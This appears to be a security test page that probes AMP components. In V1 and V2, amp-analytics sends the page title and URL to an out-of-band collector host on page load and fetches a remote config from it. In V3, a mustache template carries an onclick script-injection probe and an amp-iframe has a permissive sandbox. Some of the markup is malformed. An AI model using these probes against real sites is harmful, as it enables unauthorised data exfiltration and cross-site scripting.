<body>
<h1 id="probe-root">AMP-TESTPAGE-V1</h1>

<!-- V1: amp-analytics remote config pointing at OOB collector -->
<amp-analytics>

{
  "requests": {
    "oobPing": "https://api.anyongtech.cn/ws-oob/cb/ampprobe1/ping?title=${title}&url=${canonicalUrl}&r=${random}"

  "triggers": {
    "pageLoad": {
      "on": "visible",
      "request": "oobPing"
    }
  }
}
</script>
</amp-analytics>

<!-- V2: amp-analytics remote config fetch (config=URL) -->
<amp-analytics config="https://api.anyongtech.cn/ws-oob/cb/ampprobe1/analytics-config.json">
<script type="application/json">{"vars":{"accountId":"probe-v2"}}</script>
</amp-analytics>

<!-- V3: amp-list fetching JSON from my origin + mustache template -->
<amp-list src="https://ithrael.github.io/amp-sec-test/list.json" layout="fixed-height" height="100">
  <template type="amp-mustache">
    <div>item: {{item}}</div>
    <div onclick="console.log('XSS-V3-TEMPLATE-ONCLICK')">{{htmlProbe}}</div>

<amp-iframe src="https://ithrael.github.io/amp-sec-test/frame.html" width="200" height="100" sandbox="allow-scripts allow-same-origin allow-popups allow-forms" layout="responsive"></amp-iframe>
